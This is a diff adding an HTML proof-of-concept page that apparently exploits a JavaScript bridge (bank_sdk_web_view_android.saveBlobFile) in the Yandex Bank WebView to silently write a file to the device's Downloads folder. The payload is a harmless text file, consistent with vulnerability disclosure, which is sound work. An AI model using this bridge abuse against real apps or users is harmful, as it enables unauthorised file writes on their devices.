@@ -1,0 +1,53 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PoC: File Write Test</title>
+<style>
+body { font-family: monospace; background: #111; color: #0f0; padding: 20px; text-align: center; }
+h1 { color: #e94560; font-size: 36px; }
+#status { font-size: 24px; margin: 30px 0; padding: 20px; background: #222; border-radius: 10px; }
+</style>
+</head>
+<body>
+    <br><br><br><br>
+<div id="status">Checking bridge...</div>
+<script>
+var s = document.getElementById('status');
+try {
+    if (typeof bank_sdk_web_view_android !== 'undefined' &&
+        typeof bank_sdk_web_view_android.saveBlobFile === 'function') {
+
+        s.innerHTML = 'Bridge found! Writing poc.txt...';
+        s.style.color = '#0f0';
+
+        var content = "=== PROOF OF CONCEPT ===\n" +
+            "This file was written by JavaScript in the Yandex Bank WebView.\n" +
+            "No user confirmation was shown.\n" +
+            "Bridge: bank_sdk_web_view_android.saveBlobFile()\n" +
+            "Timestamp: " + new Date().toISOString() + "\n" +
+            "App: ru.yandex.yandexmaps\n";
+
+        var b64 = btoa(content);
+        var dataUri = "data:text/plain;base64," + b64;
+
+        bank_sdk_web_view_android.saveBlobFile(dataUri, "poc.txt", "text/plain");
+
+        s.innerHTML = 'poc.txt written to Downloads!';
+        alert("poc.txt written to Downloads!");
+
+    } else {
+        s.innerHTML = 'Bridge not available in this context.';
+        s.style.color = '#ff0';
+        alert("Bridge not found. Must run inside Bank WebView.");
+    }
+} catch(e) {
+    s.innerHTML = 'Error: ' + e.message;
+    s.style.color = '#f00';
+    alert("Error: " + e.message);
+}
+</script>
+</body>
+</html>
